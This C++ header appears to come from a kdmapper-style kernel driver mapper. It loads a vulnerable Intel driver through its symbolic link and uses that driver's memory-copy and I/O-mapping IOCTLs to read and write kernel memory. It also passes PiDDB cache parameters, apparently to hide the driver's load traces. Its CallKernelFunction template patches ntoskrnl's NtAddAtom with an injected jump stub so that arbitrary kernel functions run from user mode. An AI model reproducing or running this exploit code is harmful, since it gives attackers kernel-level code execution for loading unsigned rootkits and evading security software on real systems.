#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <memory>
#include <stdint.h>

#include "utils.hpp"
#include "stealth_driver.hpp"
#define VULNERABLE_IOCTL_COUNT 5  // MemoryCopy, MemorySet, Map/UnmapIoSpace, GetPhysicalAddress
#define INTELDRIVER_SYMLINK L"\\\\.\\Nal"


namespace DriverMapper {
	typedef bool (*MemCopyType)(HANDLE, uint64_t, uint64_t, uint64_t);
	typedef bool (*SetMemoryType)(HANDLE, uint64_t, uint32_t, uint64_t);
	typedef bool (*GetPhysicalAddressType)(HANDLE, uint64_t, uint64_t*);
	typedef uint64_t(*MapIoSpaceType)(HANDLE, uint64_t, uint32_t);
	typedef bool (*UnmapIoSpaceType)(HANDLE, uint64_t, uint32_t);

	typedef struct _DISPATCH_FUNCTIONS {
		MemCopyType Function0;
		SetMemoryType Function1;
		GetPhysicalAddressType Function2;
		MapIoSpaceType Function3;
		UnmapIoSpaceType Function4;
	} DISPATCH_FUNCTIONS, * PDISPATCH_FUNCTIONS;

	typedef struct _SYMBOLICLINK {
		WCHAR SymbolicLink[MAX_PATH];
	} SYMBOLICLINK, *PSYMBOLICLINK;

	typedef struct _FILE_NAME {
		char DriverName[MAX_PATH];
	} FILE_NAME, * PFILE_NAME;

	PVOID GetLoaderResource(LPCWSTR ResourceName);
	HANDLE LoadVulnerableDriver(LPCWSTR SymbolicLink, uintptr_t* PiDDBLockPtr, uintptr_t* PiDDBCacheTablePtr,
		ULONG DriverTimestamp);
	bool Unload(HANDLE device_handle, char* driver_name);
	void DriverCleanup();

	// Functions based on earlier functions:
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);

	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Setup function call
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom)
		{
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = DriverMapper::GetKernelModuleExport(
			*((ULONG64*)DriverMapper::GetLoaderResource(L"ntoskrnlAddr")), "NtAddAtom");
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!DriverMapper::ReadMemory(kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!DriverMapper::WriteToReadOnlyMemory(kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return DriverMapper::WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}